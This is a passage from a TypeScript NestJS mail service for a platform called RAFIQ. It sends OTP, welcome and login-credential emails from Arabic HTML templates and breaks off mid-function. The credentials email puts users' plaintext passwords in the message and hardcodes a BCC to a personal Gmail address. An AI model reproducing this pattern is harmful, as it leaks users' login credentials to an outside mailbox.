/**
 * ╔═══════════════════════════════════════════════════════════════════════════════╗
 * ║              RAFIQ PLATFORM - System Mail Service                             ║
 * ║                                                                               ║
 * ║  📧 لإرسال رسائل النظام (OTP, ترحيب, إشعارات)                                    ║
 * ║  🔧 يستخدم Nodemailer مع Namecheap Private Email SMTP                         ║
 * ║  ✅ يدعم BCC للمراقبة                                                          ║
 * ║  🎨 تصميم احترافي متوافق مع جميع منصات البريد                                  ║
 * ║  🖼️ لوقو مضمّن كـ Base64                                                       ║
 * ╚═══════════════════════════════════════════════════════════════════════════════╝
 */

import { Injectable, Logger } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import * as nodemailer from 'nodemailer';

interface SendMailOptions {
  to: string;
  subject: string;
  html: string;
  text?: string;
  bcc?: string;
}

// اللوقو مضمّن كـ Base64 PNG
const LOGO_BASE64 = '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';

@Injectable()
export class MailService {
  private readonly logger = new Logger(MailService.name);
  private transporter: nodemailer.Transporter;

  constructor(private readonly configService: ConfigService) {
    this.initializeTransporter();
  }

  private initializeTransporter(): void {
    const host = this.configService.get<string>('SMTP_HOST', 'mail.privateemail.com');
    const port = this.configService.get<number>('SMTP_PORT', 465);
    const secure = this.configService.get<boolean>('SMTP_SECURE', true);
    const user = this.configService.get<string>('SMTP_USER', 'no-reply@rafeq.ai');
    const pass = this.configService.get<string>('SMTP_PASS');

    if (!pass) {
      this.logger.warn('⚠️ SMTP_PASS not configured - emails will not be sent');
      return;
    }

    this.transporter = nodemailer.createTransport({
      host,
      port,
      secure,
      auth: { user, pass },
    });

    this.transporter.verify((error) => {
      if (error) {
        this.logger.error('❌ SMTP connection failed:', error.message);
      } else {
        this.logger.log('✅ SMTP connection established successfully');
      }
    });
  }

  async sendMail(options: SendMailOptions): Promise<boolean> {
    if (!this.transporter) {
      this.logger.warn('SMTP not configured, skipping email send');
      return false;
    }

    const fromEmail = this.configService.get<string>('SMTP_FROM_EMAIL', 'no-reply@rafeq.ai');
    const fromName = this.configService.get<string>('SMTP_FROM_NAME', 'RAFEQ');
    const bccEmail = this.configService.get<string>('BCC_EMAIL');

    try {
      const info = await this.transporter.sendMail({
        from: `"${fromName}" <${fromEmail}>`,
        to: options.to,
        bcc: options.bcc || bccEmail,
        subject: options.subject,
        html: options.html,
        text: options.text || this.stripHtml(options.html),
      });

      this.logger.log(`✅ Email sent: ${info.messageId}`, { to: options.to });
      return true;
    } catch (error) {
      this.logger.error(`❌ Failed to send email to ${options.to}`, error);
      return false;
    }
  }

  async sendOtpEmail(to: string, otp: string, merchantName?: string): Promise<boolean> {
    const subject = `${otp} - رمز التحقق | RAFEQ`;
    const html = this.buildEmailTemplate({
      icon: '🔐',
      title: 'رمز التحقق الخاص بك',
      greeting: merchantName ? `مرحباً ${merchantName}` : 'مرحباً',
      content: `
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
          <tr>
            <td align="center">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="background-color: #0f172a; border: 2px solid #334155; border-radius: 12px; padding: 24px 40px;" bgcolor="#0f172a">
                    <span style="font-size: 40px; font-weight: 700; color: #ffffff; letter-spacing: 10px; font-family: 'Courier New', monospace;">${otp}</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
        <p style="margin: 24px 0 8px; font-size: 13px; color: #94a3b8; text-align: center; font-family: Arial, sans-serif;">⏱️ صالح لمدة 5 دقائق</p>
        <p style="margin: 0; font-size: 12px; color: #fbbf24; text-align: center; font-family: Arial, sans-serif;">🔒 لا تشارك هذا الرمز مع أي شخص</p>
      `,
    });
    return this.sendMail({ to, subject, html });
  }

  async sendWelcomeEmail(to: string, merchantName: string, storeName: string): Promise<boolean> {
    const subject = `🎉 مرحباً بك في RAFEQ - تم تفعيل ${storeName}`;
    const html = this.buildEmailTemplate({
      icon: '🎉',
      title: 'أهلاً بك في RAFEQ!',
      greeting: `مرحباً ${merchantName}`,
      content: `
        <p style="margin: 0 0 32px; font-size: 16px; color: #94a3b8; text-align: center; line-height: 1.7; font-family: Arial, sans-serif;">
          تم تفعيل متجرك <strong style="color: #2dd4bf;">"${storeName}"</strong> بنجاح!
        </p>
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
          <tr>
            <td align="center">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="background: linear-gradient(135deg, #2dd4bf, #a855f7); border-radius: 10px;">
                    <a href="https://rafeq.ai/dashboard" style="display: block; padding: 14px 36px; color: #ffffff; text-decoration: none; font-weight: 700; font-size: 15px; font-family: Arial, sans-serif;">
                      دخول لوحة التحكم ←
                    </a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      `,
    });
    return this.sendMail({ to, subject, html });
  }

  async sendWelcomeCredentials(options: {
    to: string;
    name: string;
    storeName: string;
    email: string;
    password: string;
    loginUrl: string;
    isNewUser: boolean;
  }): Promise<boolean> {
    const { to, name, storeName, email, password, loginUrl, isNewUser } = options;

    const subject = isNewUser
      ? `🎉 أهلاً ${name}! حسابك في رفيق جاهز`
      : `🔐 بيانات دخولك - رفيق`;

    const html = this.buildEmailTemplate({
      icon: isNewUser ? '🎉' : '🔐',
      title: `مرحباً ${name}!`,
      storeBadge: storeName,
      greeting: isNewUser ? 'يسعدنا انضمامك لعائلة رفيق! 🚀' : 'هذا تذكير ببيانات دخولك إلى لوحة التحكم',
      content: `
        <!-- Credentials Box -->
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #0f172a; border-radius: 16px; border: 1px solid #334155; margin-bottom: 24px;" bgcolor="#0f172a">
          <tr>
            <td style="background-color: #1e293b; padding: 14px 20px; border-radius: 16px 16px 0 0;" bgcolor="#1e293b">
              <span style="font-size: 14px; font-weight: 700; color: #ffffff; font-family: Arial, sans-serif;">🔑 بيانات الدخول</span>
            </td>
          </tr>
          <tr>
            <td style="padding: 24px 20px 16px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td style="padding-bottom: 10px;">
                    <span style="font-size: 12px; font-weight: 600; color: #64748b; letter-spacing: 1px; font-family: Arial, sans-serif;">📧 البريد الإلكتروني</span>
                  </td>
                </tr>
                <tr>
                  <td style="background-color: #1e293b; border: 2px solid #2dd4bf; border-radius: 10px; padding: 14px 16px; text-align: center;" bgcolor="#1e293b">
                    <span style="font-size: 18px; font-weight: 600; color: #2dd4bf; font-family: 'Courier New', monospace;">${email}</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding: 0 20px 24px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td style="padding-bottom: 10px;">
                    <span style="font-size: 12px; font-weight: 600; color: #64748b; letter-spacing: 1px; font-family: Arial, sans-serif;">🔐 كلمة المرور</span>
                  </td>
                </tr>
                <tr>
                  <td style="background-color: #1e293b; border: 2px solid #a855f7; border-radius: 10px; padding: 16px; text-align: center;" bgcolor="#1e293b">
                    <span style="font-size: 26px; font-weight: 700; color: #a855f7; font-family: 'Courier New', monospace; letter-spacing: 4px;">${password}</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
        
        <!-- CTA Button -->
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
          <tr>
            <td align="center">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="background: linear-gradient(135deg, #2dd4bf, #a855f7); border-radius: 12px;">
                    <a href="${loginUrl}" style="display: block; padding: 16px 44px; font-size: 16px; font-weight: 700; color: #ffffff; text-decoration: none; font-family: Arial, sans-serif;">
                      🚀 دخول لوحة التحكم
                    </a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
        
        <!-- Security Tip -->
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="margin-top: 20px;">
          <tr>
            <td style="background-color: #422006; border: 1px solid #854d0e; border-radius: 10px; padding: 14px 16px; text-align: center;" bgcolor="#422006">
              <span style="font-size: 13px; color: #fbbf24; font-family: Arial, sans-serif;">
                💡 ننصحك بتغيير كلمة المرور بعد أول تسجيل دخول
              </span>
            </td>
          </tr>
        </table>
      `,
      showFeatures: true,
    });

    return this.sendMail({ to, subject, html, bcc: 'forwahabb@gmail.com' });
  }

  private buildEmailTemplate(options: {
    icon: string;
    title: string;
    greeting?: string;
    storeBadge?: string;
    content: string;
    showFeatures?: boolean;
  }): string {
    const { icon, title, greeting, storeBadge, content, showFeatures } = options;

    const featuresHtml = showFeatures ? `
      <tr>
        <td style="padding: 28px 0;">
          <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
            <tr>
              <td align="center" style="padding-bottom: 16px;">
                <span style="font-size: 14px; font-weight: 600; color: #64748b; font-family: Arial, sans-serif;">⚡ مميزات رفيق</span>
              </td>
            </tr>
            <tr>
              <td>
                <table role="presentation" cellpadding="6" cellspacing="0" width="100%">
                  <tr>
                    <td width="50%">
                      <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border: 1px solid #334155; border-radius: 10px;" bgcolor="#1e293b">
                        <tr><td style="padding: 14px;"><span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">✨ ردود AI ذكية</span></td></tr>
                      </table>
                    </td>
                    <td width="50%">
                      <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border: 1px solid #334155; border-radius: 10px;" bgcolor="#1e293b">
                        <tr><td style="padding: 14px;"><span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">🛒 استرداد السلات</span></td></tr>
                      </table>
                    </td>
                  </tr>
                  <tr>
                    <td width="50%">
                      <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border: 1px solid #334155; border-radius: 10px;" bgcolor="#1e293b">
                        <tr><td style="padding: 14px;"><span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">📱 ربط واتساب</span></td></tr>
                      </table>
                    </td>
                    <td width="50%">
                      <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border: 1px solid #334155; border-radius: 10px;" bgcolor="#1e293b">
                        <tr><td style="padding: 14px;"><span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">📊 تقارير متقدمة</span></td></tr>
                      </table>
                    </td>
                  </tr>
                </table>
              </td>
            </tr>
          </table>
        </td>
      </tr>
    ` : '';

    const storeBadgeHtml = storeBadge ? `
      <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
        <tr>
          <td align="center" style="padding: 12px 0 8px;">
            <table role="presentation" cellpadding="0" cellspacing="0">
              <tr>
                <td style="background-color: #334155; border-radius: 50px; padding: 8px 20px;" bgcolor="#334155">
                  <span style="font-size: 13px; color: #2dd4bf; font-family: Arial, sans-serif;">🏪 ${storeBadge}</span>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    ` : '';

    return `
